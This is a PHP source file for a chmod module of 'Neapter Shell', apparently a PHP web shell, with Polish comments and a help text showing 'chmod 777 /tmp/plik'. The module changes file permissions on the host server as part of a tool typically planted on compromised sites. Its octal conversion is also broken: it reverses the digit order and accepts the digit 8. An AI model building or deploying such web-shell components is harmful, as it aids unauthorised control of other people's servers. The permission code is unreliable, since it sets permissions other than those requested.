<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleChmod extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('chmod');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.10 2011-09-10 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Zmiana uprawnień dla pliku

	Użycie:
		chmod uprawnienia plik_lub_katalog

	Przykład:
		chmod 777 /tmp/plik
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        /**
         * Help
         */
        if ($this->oShell->iArgc !== 2) {
            return self::getHelp();
        }

        /**
         * Chmod jest wymagany
         */
        if (!ctype_digit($this->oShell->aArgv[0]) || strlen($this->oShell->aArgv[0]) !== 3) {
            return sprintf('Błędny chmod "%d"', $this->oShell->aArgv[0]);
        }

        /**
         * Plik musi istniec
         */
        if (!is_file($this->oShell->aArgv[1])) {
            return sprintf('Plik "%s" nie istnieje', $this->oShell->aArgv[1]);
        }

        if (!((strlen($this->oShell->aArgv[0]) === 3) && ctype_digit($this->oShell->aArgv[0]))) {
            return 'Wprowadzono błędne uprawnienia!!!';
        }

        $aChmod = str_split($this->oShell->aArgv[0]);

        $sChmod = 0;

        /**
         * Zamiana 777 dziesiatkowo na 777 osemkowo
         */
        for ($i = 0; $i < 3; ++$i) {
            if ($aChmod[$i] > 8) {
                return 'Wprowadzono błędne uprawnienia!!!';
            }

            $sChmod += $aChmod[$i] * pow(8, $i);
        }

        /**
         * Zmiana uprawnien
         */
        if (chmod($this->oShell->aArgv[1], $sChmod)) {
            return 'Uprawnienia <span class="green">zostały zmienione</span>';
        }

        return 'Uprawnienia <span class="red">nie zostały zmienione</span>';
    }

}
